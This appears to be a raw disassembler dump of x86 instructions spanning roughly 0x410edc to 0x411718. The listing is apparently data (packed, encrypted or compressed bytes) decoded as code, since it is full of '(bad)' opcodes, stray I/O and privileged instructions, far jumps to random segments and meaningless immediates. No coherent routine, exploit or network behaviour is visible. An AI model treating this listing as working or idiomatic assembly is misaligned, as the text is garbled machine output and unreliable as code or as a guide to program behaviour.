  410edc:	ins    BYTE PTR es:[edi],dx
  410edd:	mov    ch,0x25
  410edf:	enter  0x5a0a,0xec
  410ee3:	daa    
  410ee4:	xchg   edx,eax
  410ee5:	sahf   
  410ee6:	lds    eax,FWORD PTR [ebx-0x5b643dda]
  410eec:	sahf   
  410eed:	(bad)  
  410eee:	push   esi
  410eef:	pop    ebx
  410ef0:	jl     0x410f4d
  410ef2:	ss sbb al,0xfa
  410ef5:	test   eax,0xdc5ebd61
  410efa:	mov    ecx,DWORD PTR [esi-0x29]
  410efd:	and    DWORD PTR [eax],edx
  410eff:	imul   ebx,DWORD PTR [edi-0x3c],0xffffffec
  410f03:	xchg   ebp,eax
  410f04:	sub    DWORD PTR [eax-0x370971bb],edx
  410f0a:	inc    ebx
  410f0b:	and    bh,bh
  410f0d:	fist   WORD PTR [ebp+0x68dede67]
  410f13:	pusha  
  410f14:	jp     0x410f2f
  410f16:	sub    edx,edx
  410f18:	sbb    eax,0xa46556a2
  410f1d:	ja     0x410efc
  410f1f:	sub    DWORD PTR [eax-0x23],edi
  410f22:	or     BYTE PTR [edx],bh
  410f24:	add    BYTE PTR [edx+0x69c7685c],ah
  410f2a:	adc    BYTE PTR [ebx-0x52c641e7],bh
  410f30:	mov    edi,0xbd3c60f5
  410f35:	add    al,0x5d
  410f37:	test   bl,ah
  410f39:	hlt    
  410f3a:	cmp    DWORD PTR ss:[ecx-0x2],esp
  410f3e:	stc    
  410f3f:	ja     0x410f94
  410f41:	aad    0x4
  410f43:	call   0x9f25eb66
  410f48:	cwde   
  410f49:	sub    eax,0x69c72acc
  410f4e:	mul    edi
  410f50:	fldcw  WORD PTR [edi]
  410f52:	mov    bl,0xe7
  410f54:	inc    eax
  410f55:	xor    dh,al
  410f57:	push   cs
  410f58:	mov    ecx,0x65bacd4c
  410f5d:	std    
  410f5e:	mov    bh,0x44
  410f60:	sbb    eax,0xf4ec6d4b
  410f65:	mov    edx,0xa3c5e373
  410f6a:	pop    es
  410f6b:	inc    edi
  410f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f6d:	push   ebp
  410f6e:	shl    DWORD PTR [ecx-0x6a],1
  410f71:	cmp    bl,BYTE PTR [esi]
  410f73:	inc    ecx
  410f74:	jmp    0x410fed
  410f76:	test   DWORD PTR [si+0x67],esi
  410f7a:	(bad)  
  410f7b:	in     al,dx
  410f7c:	mov    ah,bl
  410f7e:	xchg   DWORD PTR [edi+0x5a346a27],ebp
  410f84:	adc    DWORD PTR [esi+0x34],eax
  410f87:	out    0x3b,al
  410f89:	and    BYTE PTR [esi-0x5b],bl
  410f8c:	std    
  410f8d:	jecxz  0x410f37
  410f8f:	and    DWORD PTR ds:0xf6afdf33,0x3f
  410f96:	jle    0x410f58
  410f98:	outs   dx,BYTE PTR ds:[esi]
  410f99:	popa   
  410f9a:	and    BYTE PTR [ebp-0x732f0c9e],bl
  410fa0:	stos   DWORD PTR es:[edi],eax
  410fa1:	sub    al,0x7d
  410fa3:	repnz mov eax,ds:0xee4cce7a
  410fa9:	dec    esp
  410faa:	add    bh,BYTE PTR [esi-0x25]
  410fad:	out    dx,eax
  410fae:	adc    eax,0xe51e60c3
  410fb3:	mov    WORD PTR [edx+0x14b2d383],ss
  410fb9:	xor    dh,bh
  410fbb:	mov    esi,0xebc01f04
  410fc0:	aad    0x6f
  410fc2:	call   FWORD PTR [eax]
  410fc4:	int3   
  410fc5:	xchg   edx,eax
  410fc6:	into   
  410fc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fc8:	adc    bh,BYTE PTR [ebp-0x32ba71ab]
  410fce:	int    0x24
  410fd0:	in     al,0x98
  410fd2:	jl     0x411010
  410fd4:	fmul   QWORD PTR [esi+ecx*8]
  410fd7:	pop    esp
  410fd8:	xor    eax,0x688bc7ac
  410fdd:	pop    esp
  410fde:	(bad)  
  410fdf:	pop    ecx
  410fe0:	sbb    eax,0xfc093f87
  410fe5:	cmp    DWORD PTR [ebx+0x537fcc4b],edx
  410feb:	push   edx
  410fec:	rep lods eax,DWORD PTR ds:[si]
  410fef:	rcr    BYTE PTR [esi+ebx*1+0x508d8d0a],0x2
  410ff7:	les    ebx,FWORD PTR [eax+0x3907bc4b]
  410ffd:	ret    0x5021
  411000:	in     al,dx
  411001:	dec    ecx
  411002:	sbb    DWORD PTR [ebp+0x7f],esp
  411005:	add    ebx,0xa70df4e6
  41100b:	cld    
  41100c:	rol    DWORD PTR [esi-0x242461a6],1
  411012:	sbb    BYTE PTR [ebx-0x2df5f517],dl
  411018:	sbb    DWORD PTR [eax],0x72
  41101b:	cmp    al,0x32
  41101d:	rol    DWORD PTR [ebp+edx*8-0x7e],cl
  411021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411022:	xchg   BYTE PTR [esi+eax*1],dl
  411025:	fisub  WORD PTR [esi-0x5b19ed41]
  41102b:	sub    esp,DWORD PTR [edx-0x5df7fe20]
  411031:	std    
  411032:	and    BYTE PTR [eax],al
  411034:	outs   dx,BYTE PTR ds:[esi]
  411035:	leavew 
  411037:	call   0x1ff780d0
  41103c:	jae    0x410fd9
  41103e:	int3   
  41103f:	inc    edx
  411040:	push   esp
  411041:	shl    ecx,1
  411043:	adc    bh,dh
  411045:	mov    cl,0x35
  411047:	inc    eax
  411048:	inc    edx
  411049:	add    edx,ebx
  41104b:	sub    al,0x28
  41104d:	cmp    DWORD PTR [ebp+0x3d],edx
  411050:	dec    edi
  411051:	pop    ebp
  411052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411053:	push   cs
  411054:	add    eax,0xffffffc1
  411057:	mov    gs,esp
  411059:	in     al,0x69
  41105b:	mov    ebx,0xbee3c2f3
  411060:	and    eax,0x45c259ae
  411065:	push   edx
  411066:	(bad)  
  411068:	mov    al,ds:0x799dda5d
  41106d:	inc    ebx
  41106e:	out    0xe,eax
  411070:	repz or bl,dh
  411073:	mov    ebp,0x31eead01
  411078:	dec    edi
  411079:	or     ebx,edx
  41107b:	mov    al,0xe5
  41107d:	arpl   WORD PTR [edi],di
  41107f:	and    eax,0xadbfb96a
  411084:	inc    edi
  411085:	mov    eax,ds:0x3a5be91d
  41108a:	scas   eax,DWORD PTR es:[edi]
  41108b:	mov    DWORD PTR [esi],eax
  41108d:	leave  
  41108e:	shr    BYTE PTR [ecx-0x74],0x2a
  411092:	out    0x3,eax
  411094:	cmp    DWORD PTR [ecx],ebp
  411096:	test   DWORD PTR [edi-0x49],0x7e85d9ef
  41109d:	push   ebp
  41109e:	mov    bh,0x11
  4110a0:	inc    esi
  4110a1:	mov    ecx,0xbcad2f28
  4110a6:	mov    dh,0x94
  4110a8:	mov    ecx,0xac3fff0c
  4110ad:	adc    BYTE PTR [edi-0x7b09104f],0x43
  4110b4:	pop    eax
  4110b5:	xchg   esp,eax
  4110b6:	sti    
  4110b7:	xor    al,0xa1
  4110b9:	push   esi
  4110ba:	cs push 0x19
  4110bd:	xchg   ebx,eax
  4110be:	fstp   st(6)
  4110c0:	aam    0xbe
  4110c2:	dec    ebp
  4110c3:	sbb    DWORD PTR [eax+eax*2],edx
  4110c6:	scas   al,BYTE PTR es:[edi]
  4110c7:	push   ebx
  4110c8:	pop    es
  4110c9:	push   eax
  4110ca:	mov    DWORD PTR [esi+0x45e90ef],esp
  4110d0:	jl     0x411096
  4110d2:	mov    ecx,0xf4cc33d4
  4110d7:	pop    esi
  4110d8:	jb     0x411064
  4110da:	hlt    
  4110db:	lock jae 0x411097
  4110de:	mov    WORD PTR [ebp+0x46],?
  4110e1:	aaa    
  4110e2:	adc    eax,0x2ed74dc6
  4110e7:	jbe    0x41112c
  4110e9:	jecxz  0x411106
  4110eb:	sar    DWORD PTR [esi+0x3d940e60],0xaf
  4110f2:	mov    dl,0x1
  4110f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110f5:	pop    esp
  4110f6:	lds    edx,FWORD PTR [edx+0x2b]
  4110f9:	or     BYTE PTR [esi-0x70675282],ch
  4110ff:	aam    0xe9
  411101:	jmp    0xa47c914f
  411106:	ror    ebp,0xf0
  411109:	cmc    
  41110a:	push   edi
  41110b:	and    al,0x78
  41110d:	rol    ch,1
  41110f:	(bad)  
  411110:	inc    edx
  411111:	shr    DWORD PTR [eax+0x13bcd73],1
  411117:	cli    
  411118:	jo     0x41117a
  41111a:	sbb    DWORD PTR [eax+0x5],esp
  41111d:	ficomp DWORD PTR [edi-0x5e]
  411120:	cld    
  411121:	aaa    
  411122:	dec    ebp
  411123:	mov    eax,ds:0x944c50f6
  411128:	sbb    BYTE PTR [eax],bh
  41112a:	xchg   ecx,eax
  41112b:	mov    esi,0x2ce8fe21
  411130:	add    eax,esp
  411132:	cmp    eax,0x962d7fd4
  411137:	in     al,0x46
  411139:	sub    DWORD PTR [ebp-0x7a],edx
  41113c:	adc    ecx,edx
  41113e:	test   BYTE PTR [eax-0x48ad7bb0],al
  411144:	popf   
  411145:	gs ret 
  411147:	lods   al,BYTE PTR ds:[esi]
  411148:	or     eax,0x6852cd18
  41114d:	aad    0x5d
  41114f:	jmp    0x77fa:0x999358aa
  411156:	repnz pop ss
  411158:	jecxz  0x41117d
  41115a:	cwde   
  41115b:	mov    ecx,0xcbe18748
  411160:	stos   BYTE PTR es:[edi],al
  411161:	push   cs
  411162:	div    BYTE PTR [ebx+0x63]
  411165:	outs   dx,DWORD PTR ds:[esi]
  411166:	xchg   dl,bl
  411168:	es dec ecx
  41116a:	push   es
  41116b:	fwait
  41116c:	jl     0x411143
  41116e:	push   cs
  41116f:	or     al,0x8b
  411171:	dec    ebp
  411172:	cld    
  411173:	jmp    0x41167e
  411178:	(bad)
  41117b:	retf   
  41117c:	cmp    eax,0x69c9c9c9
  411181:	sahf   
  411182:	repz push 0x62868b42
  411188:	hlt    
  411189:	jb     0x411203
  41118b:	js     0x4111f7
  41118d:	jl     0x411207
  41118f:	js     0x41114b
  411191:	xor    ecx,esp
  411193:	sahf   
  411194:	arpl   cx,sp
  411196:	xchg   ebp,eax
  411197:	in     al,0x6d
  411199:	retf   
  41119a:	sub    BYTE PTR [ecx+0x25],bl
  41119d:	and    esi,ebx
  41119f:	push   edi
  4111a0:	stos   DWORD PTR es:[edi],eax
  4111a1:	mov    ch,0x6e
  4111a3:	test   al,0x7d
  4111a5:	or     DWORD PTR [edx+eax*8-0x7ba43edc],0xffffffed
  4111ad:	iret   
  4111ae:	add    ecx,ecx
  4111b0:	add    al,0xa2
  4111b2:	or     esi,0xd339446a
  4111b8:	test   DWORD PTR [esi+0x32],edi
  4111bb:	fisubr WORD PTR [edx]
  4111bd:	dec    edi
  4111be:	test   eax,0x40169372
  4111c3:	add    BYTE PTR [ecx],0x88
  4111c6:	call   0x48c9275f
  4111cb:	out    0x8d,eax
  4111cd:	dec    ebx
  4111ce:	dec    ebp
  4111cf:	cmp    DWORD PTR [eax],0x388b0a1c
  4111d5:	inc    esi
  4111d6:	xor    dh,BYTE PTR [ebx-0x17604d3c]
  4111dc:	xchg   esi,eax
  4111dd:	(bad)  
  4111df:	or     eax,0xee94d5ee
  4111e4:	sub    eax,0x86442013
  4111e9:	jno    0x4111b0
  4111eb:	mov    ecx,0xa467207a
  4111f0:	add    ch,BYTE PTR [ebx+0x14]
  4111f3:	sbb    BYTE PTR [edx-0x5eb74ff3],0xe9
  4111fa:	rol    DWORD PTR [ebp+0x73],cl
  4111fd:	xchg   esp,eax
  4111fe:	adc    esp,DWORD PTR [edi]
  411200:	fcmovnu st,st(6)
  411202:	call   0x4cba:0x30317908
  411209:	adc    dl,BYTE PTR [esi+0x4879c3cf]
  41120f:	inc    ebx
  411210:	jmp    0x5cf5:0xca36c8bb
  411217:	mov    eax,ds:0xd1a54ba3
  41121c:	retf   
  41121d:	pop    eax
  41121e:	(bad)  
  41121f:	mov    edi,0xf0f56f46
  411224:	mov    al,ds:0x3e26dc45
  411229:	and    eax,eax
  41122b:	add    edx,DWORD PTR [esi+0x8]
  41122e:	mov    edx,0xac9beceb
  411233:	into   
  411234:	popf   
  411235:	inc    eax
  411236:	rcl    BYTE PTR [ebx-0x57],1
  411239:	and    eax,0xe9b12014
  41123e:	data16 (bad) 
  411240:	ja     0x41127b
  411242:	std    
  411243:	(bad)  
  411244:	mov    ch,al
  411246:	and    ecx,0x3a8469e4
  41124c:	repnz mov esp,0x95b902b6
  411252:	test   al,0x29
  411254:	hlt    
  411255:	test   ebx,ebx
  411257:	cwde   
  411258:	fwait
  411259:	sbb    al,0xa9
  41125b:	mov    ebp,0x65d3ae3b
  411260:	test   al,0xfd
  411263:	aaa    
  411264:	iret   
  411265:	pushf  
  411266:	pop    esi
  411267:	cmp    BYTE PTR [esi+eax*1],0x63
  41126b:	(bad)  
  41126d:	ss lahf 
  41126f:	sbb    esp,DWORD PTR ds:0x79f10562
  411275:	lods   eax,DWORD PTR ds:[esi]
  411276:	mov    ah,0x4b
  411278:	sbb    edi,DWORD PTR [edi-0x392f88bf]
  41127e:	in     eax,dx
  41127f:	popa   
  411280:	pop    esp
  411281:	lods   eax,DWORD PTR ds:[esi]
  411282:	mov    esp,0x2d2511a7
  411287:	fist   WORD PTR [ebp+ecx*1-0x80]
  41128b:	int    0x64
  41128d:	push   ecx
  41128e:	ins    DWORD PTR es:[edi],dx
  41128f:	mov    esp,ds
  411291:	fiadd  WORD PTR [eiz*2+0x577262b9]
  411298:	cmp    eax,0x4626ae87
  41129d:	dec    eax
  41129e:	cmc    
  41129f:	retf   0xb73a
  4112a2:	int    0xb
  4112a4:	fdivp  st(7),st
  4112a6:	inc    edi
  4112a7:	call   FWORD PTR [ecx-0x22]
  4112aa:	fs push ebx
  4112ac:	sub    al,0xb9
  4112ae:	mov    eax,ds:0x6658bb03
  4112b3:	loopne 0x411296
  4112b5:	adc    ebx,esp
  4112b7:	add    BYTE PTR [edi-0x71],ch
  4112ba:	lds    edi,FWORD PTR [ecx]
  4112bc:	mov    ebp,0x997c2b2d
  4112c1:	or     ah,BYTE PTR [edx-0x4e]
  4112c4:	imul   edi,DWORD PTR [ebp+0x64],0x6c9206c3
  4112cb:	retf   0x7413
  4112ce:	pusha  
  4112cf:	dec    ebx
  4112d0:	xchg   BYTE PTR [edx+edi*2-0x10f7f7ba],ah
  4112d7:	mov    esi,0x22a42b00
  4112dc:	test   BYTE PTR [esi],ah
  4112de:	mov    esi,0xb4b89026
  4112e3:	enter  0x3899,0x36
  4112e7:	xor    al,0x40
  4112e9:	push   edi
  4112ea:	in     al,0x1
  4112ec:	jae    0x411291
  4112ee:	xor    bh,dh
  4112f0:	cmp    al,0x13
  4112f2:	push   cs
  4112f3:	mov    esi,0x829cad47
  4112f8:	xchg   edx,eax
  4112f9:	and    BYTE PTR [edi+eiz*8+0x13],0xc5
  4112fe:	jg     0x411305
  411300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411301:	test   eax,0x54666e
  411306:	leave  
  411307:	test   eax,0x6dc4e967
  41130c:	nop
  41130d:	xor    dh,ah
  41130f:	mov    ah,0xc3
  411311:	sub    al,0x2f
  411313:	fsubr  DWORD PTR [esp+ecx*2+0x126ede07]
  41131a:	push   ebx
  41131b:	dec    esi
  41131c:	mov    cl,0x56
  41131e:	jmp    0x52ed:0x4f57e795
  411325:	adc    DWORD PTR [edi+0x22],0xffffffa3
  411329:	(bad)  [ebx]
  41132b:	fsubr  st,st(0)
  41132d:	outs   dx,BYTE PTR ds:[esi]
  41132e:	in     eax,dx
  41132f:	rcr    DWORD PTR [ebp-0x2cc13cfc],1
  411335:	lods   al,BYTE PTR ds:[esi]
  411336:	enter  0xe138,0x48
  41133a:	nop
  41133b:	fsubr  QWORD PTR [edx-0x30]
  41133e:	cmp    eax,0x814741ba
  411343:	pop    ss
  411344:	sar    cl,0xf6
  411347:	pop    ss
  411348:	sbb    al,0xae
  41134a:	les    edx,FWORD PTR [eax+0x2e]
  41134d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41134e:	jmp    0x4113c4
  411350:	bound  ebx,QWORD PTR [edx+0x2]
  411353:	lods   eax,DWORD PTR ds:[esi]
  411354:	and    edx,edi
  411356:	rol    BYTE PTR [edx],0xc7
  411359:	stos   BYTE PTR es:[edi],al
  41135a:	int    0x24
  41135c:	xchg   ch,ch
  41135e:	cdq    
  41135f:	jmp    0xf771:0x40e1e864
  411366:	inc    ebx
  411367:	jmp    0x120e:0xc1d38e0f
  41136e:	or     BYTE PTR [esi+esi*4],ch
  411371:	(bad)  
  411372:	adc    eax,0xb2601da3
  411377:	inc    ebp
  411378:	sbb    eax,0x50706e9d
  41137d:	jb     0x4113f4
  41137f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411380:	shr    DWORD PTR [esi+0x13323d9b],0x35
  411387:	aam    0xa
  411389:	std    
  41138a:	nop
  41138b:	ins    DWORD PTR es:[edi],dx
  41138c:	push   esp
  41138d:	aad    0x84
  41138f:	leave  
  411390:	jo     0x4113f0
  411392:	or     ch,BYTE PTR [esi+0x10]
  411395:	out    dx,al
  411396:	xchg   dl,bl
  411398:	je     0x4113ab
  41139a:	add    eax,edx
  41139c:	and    ch,BYTE PTR [eax-0x12dc7828]
  4113a2:	jo     0x4113de
  4113a4:	addr16 mov dh,0x5d
  4113a7:	icebp  
  4113a8:	add    eax,0x15d693cf
  4113ad:	xor    al,0x2d
  4113af:	sti    
  4113b0:	adc    DWORD PTR [ebp+0x58],eax
  4113b3:	or     al,0x0
  4113b5:	stc    
  4113b6:	mov    esp,0x9e9e9fda
  4113bb:	aad    0xf6
  4113bd:	mov    eax,ds:0xea21d44c
  4113c2:	sbb    bh,BYTE PTR [edi+ebx*1-0xa]
  4113c6:	and    DWORD PTR ds:0x93a2be23,eax
  4113cc:	psraw  mm6,mm4
  4113cf:	pop    edi
  4113d0:	dec    ebx
  4113d1:	mov    bl,0xb4
  4113d3:	jl     0x41143f
  4113d5:	and    eax,0xb106ecbc
  4113da:	fs mov ebx,0xb1b1a341
  4113e0:	ss add eax,0x18ccce72
  4113e6:	cwde   
  4113e7:	bnd jmp 0x4113f9
  4113ea:	pop    edx
  4113eb:	push   ecx
  4113ec:	rol    bh,cl
  4113ee:	jno    0x4113cc
  4113f0:	int3   
  4113f1:	add    eax,0x71a9b97b
  4113f6:	dec    eax
  4113f7:	add    al,0x14
  4113f9:	add    al,0x6c
  4113fb:	or     dl,BYTE PTR [ebp+ebp*8+0x4c]
  4113ff:	mov    ch,0x7b
  411401:	add    ebx,DWORD PTR [ebp-0x30ed1fc6]
  411407:	push   0x47
  411409:	mov    eax,ds:0x6e9c90aa
  41140e:	xchg   ebp,eax
  41140f:	lods   eax,DWORD PTR ds:[esi]
  411410:	outs   dx,BYTE PTR ds:[esi]
  411411:	loopne 0x41139d
  411413:	les    ecx,FWORD PTR [edx]
  411415:	or     BYTE PTR [ebp-0x17e06118],0x35
  41141c:	fistp  WORD PTR [ebx]
  41141e:	inc    esp
  41141f:	dec    ecx
  411420:	pop    ecx
  411421:	int3   
  411422:	(bad)  
  411423:	cmc    
  411424:	js     0x41140c
  411426:	and    al,0x77
  411428:	inc    edx
  411429:	xchg   esp,eax
  41142a:	enter  0x501f,0x8
  41142e:	xor    al,0x64
  411430:	test   eax,0xbac4ee7d
  411435:	push   0x6dd6ce2f
  41143a:	or     DWORD PTR [ebx-0x6e],ebx
  41143d:	sbb    ch,bl
  41143f:	mov    al,ds:0xedee02fc
  411444:	shl    BYTE PTR [esp+edi*4+0x6d6c59eb],cl
  41144b:	inc    ebx
  41144c:	sti    
  41144d:	xchg   DWORD PTR ds:0x2fa16be5,esp
  411453:	sbb    al,0x55
  411455:	push   cs
  411456:	call   0xf12ae648
  41145b:	xchg   ecx,eax
  41145c:	pop    ss
  41145d:	cmc    
  41145e:	mov    ebp,0x900aca9d
  411463:	push   eax
  411464:	or     DWORD PTR [ecx+0x2736e488],0x71fb2a57
  41146e:	idiv   DWORD PTR [edx]
  411470:	jns    0x41147c
  411472:	sub    BYTE PTR [ebp-0x40],ch
  411475:	xor    eax,0xe22e41ee
  41147a:	xor    DWORD PTR [esi+0x38cd88d7],eax
  411480:	scas   al,BYTE PTR es:[edi]
  411481:	or     DWORD PTR [eax+0x4ce56ebd],ecx
  411487:	js     0x41145a
  411489:	or     eax,0x271b4fcc
  41148e:	clc    
  41148f:	mov    edx,0x78778a37
  411494:	sub    edx,DWORD PTR [ebp-0x6a8b0e83]
  41149a:	mov    DWORD PTR [esi-0x16ed3053],esi
  4114a0:	ss and eax,edi
  4114a3:	inc    esp
  4114a4:	pop    edx
  4114a5:	sub    al,0x1f
  4114a7:	jne    0x411521
  4114a9:	xor    BYTE PTR [edi+ebx*2+0x55],al
  4114ad:	mov    al,ds:0x3cd40cca
  4114b2:	fidivr WORD PTR [ebp-0x7c6c1685]
  4114b8:	retf   
  4114b9:	(bad)  
  4114bb:	jns    0x411477
  4114bd:	pop    esi
  4114be:	mov    dh,0xbf
  4114c0:	ins    BYTE PTR es:[edi],dx
  4114c1:	push   edx
  4114c2:	jge    0x411452
  4114c4:	jae    0x41151d
  4114c6:	clc    
  4114c7:	mov    eax,0x7c4fffb5
  4114cc:	cmc    
  4114cd:	push   esp
  4114ce:	imul   ecx,DWORD PTR [edx-0x50830cec],0x41f687cd
  4114d8:	es in  eax,0xdf
  4114db:	sbb    BYTE PTR ds:0xea1233b3,bl
  4114e1:	mov    edi,esp
  4114e3:	push   ebx
  4114e4:	xlat   BYTE PTR ds:[ebx]
  4114e5:	iret   
  4114e6:	daa    
  4114e7:	and    ebx,DWORD PTR [eax]
  4114e9:	cld    
  4114ea:	lock sub DWORD PTR [ebx-0x65f2d8f0],esi
  4114f1:	mov    dl,0x80
  4114f3:	enter  0x6bc4,0xf2
  4114f7:	repnz lds edi,FWORD PTR [esi+ebx*8-0xab73e0a]
  4114ff:	fbld   TBYTE PTR [ebp-0x2b]
  411502:	in     al,0x71
  411504:	jmp    0x564a687b
  411509:	cmp    DWORD PTR [ebp-0x625c553],ebx
  41150f:	dec    ebx
  411510:	retf   0x199a
  411513:	pop    esi
  411514:	ja     0x4114a1
  411516:	cmp    al,0x7c
  411518:	inc    edx
  411519:	or     bh,dl
  41151b:	adc    dh,cl
  41151d:	pop    esp
  41151e:	repnz dec edi
  411520:	or     BYTE PTR [ebp+0xc],al
  411523:	test   eax,0x28011b4e
  411528:	mov    ebx,0x593feec8
  41152d:	lahf   
  41152e:	iret   
  41152f:	mov    ecx,0x5694fb20
  411534:	or     BYTE PTR [edi-0x41],cl
  411537:	pop    esp
  411538:	test   BYTE PTR [ecx-0x68da20bb],0x77
  41153f:	push   ebx
  411540:	enter  0x2dc5,0x33
  411544:	sbb    esp,ecx
  411546:	jle    0x41152c
  411548:	inc    esp
  411549:	jae    0x411547
  41154b:	jb     0x41154a
  41154d:	into   
  41154e:	into   
  41154f:	into   
  411550:	sub    al,0xd5
  411552:	ja     0x41156c
  411554:	add    al,0x9c
  411556:	inc    eax
  411557:	inc    ecx
  411558:	push   ebp
  411559:	pop    edi
  41155a:	stos   BYTE PTR es:[edi],al
  41155b:	ds xchg ebx,eax
  41155d:	cs pop esp
  41155f:	mov    esp,0xc41205df
  411564:	daa    
  411565:	fwait
  411566:	xor    eax,0xb8cafd1a
  41156b:	stos   BYTE PTR es:[edi],al
  41156c:	cmp    BYTE PTR [esi+0x79],bl
  41156f:	jo     0x4115ed
  411571:	les    ecx,FWORD PTR [esi]
  411573:	fisttp WORD PTR [ecx+0x2a62a93]
  411579:	jno    0x4115f3
  41157b:	dec    ebp
  41157c:	and    ecx,DWORD PTR [ebx+0x4d]
  41157f:	lea    ebx,[ecx+0x52]
  411582:	xchg   ecx,eax
  411583:	jae    0x411524
  411585:	popf   
  411586:	or     edi,DWORD PTR [edx-0x2d7e3ee0]
  41158c:	push   0x20
  41158e:	and    al,0x40
  411590:	and    eax,0x838facf0
  411595:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411597:	push   esp
  411598:	out    dx,al
  411599:	and    eax,0x3b331281
  41159e:	sub    al,0xb9
  4115a0:	fcom   QWORD PTR [ecx]
  4115a2:	pop    edx
  4115a3:	and    DWORD PTR [si-0x4c],ecx
  4115a7:	lahf   
  4115a8:	jae    0x41160c
  4115aa:	pop    ds
  4115ab:	aaa    
  4115ac:	hlt    
  4115ad:	aaa    
  4115ae:	bnd jbe 0x4115bc
  4115b1:	in     eax,0xcd
  4115b3:	mov    al,ds:0xa109a13b
  4115b8:	push   es
  4115b9:	sbb    al,0xf6
  4115bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115bd:	popf   
  4115be:	loopne 0x411601
  4115c0:	jo     0x411603
  4115c2:	in     eax,dx
  4115c3:	xchg   BYTE PTR [esi+0x5c0e073a],bl
  4115c9:	inc    eax
  4115ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115cb:	jae    0x411620
  4115cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115ce:	add    DWORD PTR [edi-0x2],eax
  4115d1:	fcom   st(5)
  4115d3:	test   DWORD PTR [ebx+eax*1],ebp
  4115d6:	in     al,0x26
  4115d8:	mov    esp,DWORD PTR [eax+0x3a]
  4115db:	out    0xad,eax
  4115dd:	call   0xd33f:0x14eb9318
  4115e4:	cdq    
  4115e5:	stos   BYTE PTR es:[edi],al
  4115e6:	or     eax,0x15c6fde7
  4115eb:	xchg   ebx,eax
  4115ec:	jnp    0x41161f
  4115ee:	mov    ebp,0xc18191c3
  4115f3:	mov    eax,DWORD PTR [ecx]
  4115f5:	mov    esp,0x34a9eea1
  4115fa:	cmp    al,BYTE PTR [ecx-0x139695c8]
  411600:	test   eax,0xe0f0e34c
  411605:	xchg   edx,eax
  411606:	lock arpl WORD PTR [eax+0x28e2b77d],bp
  41160d:	out    dx,eax
  41160e:	xor    DWORD PTR ds:0x3a7adf7e,edx
  411614:	mov    al,ds:0x7d485632
  411619:	xchg   edx,eax
  41161a:	xchg   esi,eax
  41161b:	xchg   edi,eax
  41161c:	mov    ebp,0x2e8fe635
  411621:	xor    ch,BYTE PTR [ebx]
  411623:	mov    es:0xd02672f0,eax
  411629:	lods   al,BYTE PTR ds:[esi]
  41162a:	mov    bl,0xda
  41162c:	aaa    
  41162d:	pop    ds
  41162e:	lock daa 
  411630:	cmp    edi,edi
  411632:	cld    
  411633:	mov    edi,0x9c1b3e90
  411638:	sub    DWORD PTR [edx],eax
  41163a:	sub    eax,0xc16e2c7a
  41163f:	pop    ds
  411640:	pop    ds
  411641:	fisubr DWORD PTR [edi-0x40]
  411644:	and    dh,0xf2
  411647:	xchg   edx,eax
  411648:	pop    ebp
  411649:	mov    ebp,0x2ce59aa8
  41164e:	inc    esi
  41164f:	(bad)  
  411650:	mov    ch,0x94
  411652:	adc    edx,DWORD PTR [edx]
  411654:	push   ds
  411655:	es lahf 
  411657:	adc    DWORD PTR [ebx+0x30],ecx
  41165a:	xor    esi,DWORD PTR [edx+0x10d61abb]
  411660:	add    al,0xd8
  411662:	sbb    eax,0xb0842463
  411667:	gs inc edx
  411669:	in     al,0x91
  41166b:	shr    DWORD PTR [esi],cl
  41166d:	adc    eax,0x5274a8bb
  411672:	add    DWORD PTR [esi+eiz*4],eax
  411675:	imul   esi,ecx,0xed9a30f9
  41167b:	(bad)  
  41167d:	xchg   edx,eax
  41167e:	xor    al,0x43
  411680:	sub    al,0x3b
  411682:	mov    BYTE PTR [ecx],al
  411684:	lea    eax,[ebp-0x4]
  411687:	inc    BYTE PTR [eax]
  411689:	inc    eax
  41168a:	jmp    0x411b95
  41168f:	ret    
  411690:	cmp    eax,0xd5d2c0c8
  411695:	fcmovne st,st(1)
  411697:	out    dx,eax
  411698:	cld    
  411699:	mov    al,0x96
  41169b:	jb     0x41170f
  41169d:	cmp    eax,0x7875e646
  4116a2:	js     0x41170e
  4116a4:	jl     0x41171e
  4116a6:	js     0x411688
  4116a8:	scas   eax,DWORD PTR es:[edi]
  4116a9:	aaa    
  4116aa:	mov    ebp,0x8bc786f6
  4116af:	jnp    0x411714
  4116b1:	outs   dx,DWORD PTR ds:[esi]
  4116b2:	add    BYTE PTR [esi],0x9b
  4116b5:	sbb    al,ah
  4116b7:	lahf   
  4116b8:	and    dl,BYTE PTR [edx]
  4116ba:	mov    BYTE PTR [ecx+0x6b65ea7b],dh
  4116c0:	inc    ebp
  4116c1:	out    dx,eax
  4116c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116c3:	inc    ebx
  4116c4:	and    DWORD PTR [eax-0x2a7b13c6],0x7c
  4116cb:	ds pop ecx
  4116cd:	pop    edx
  4116ce:	mov    ch,BYTE PTR [ebx+eiz*2+0x72e47682]
  4116d5:	pop    edx
  4116d6:	xchg   esp,ecx
  4116d8:	(bad)  
  4116d9:	outs   dx,DWORD PTR ds:[esi]
  4116da:	jp     0x411688
  4116dc:	leave  
  4116dd:	stc    
  4116de:	je     0x411712
  4116e0:	repnz and ah,BYTE PTR [esi+edi*8-0x2fd9f193]
  4116e8:	push   ecx
  4116e9:	(bad)
  4116ec:	mov    esp,0xd9ffe122
  4116f1:	(bad)  
  4116f2:	pusha  
  4116f3:	shl    ah,1
  4116f5:	stos   DWORD PTR es:[edi],eax
  4116f6:	sbb    al,0x12
  4116f8:	xor    bl,BYTE PTR [ecx-0xc0090cd]
  4116fe:	push   esp
  4116ff:	(bad)  
  411700:	imul   edi,edi,0x852adf76
  411706:	cs add eax,0xa59dd358
  41170c:	xor    edx,edi
  41170e:	test   BYTE PTR [ecx-0x63],ch
  411711:	sahf   
  411712:	xor    eax,0xcfce8585
  411717:	pushf  
  411718:	push   ebx
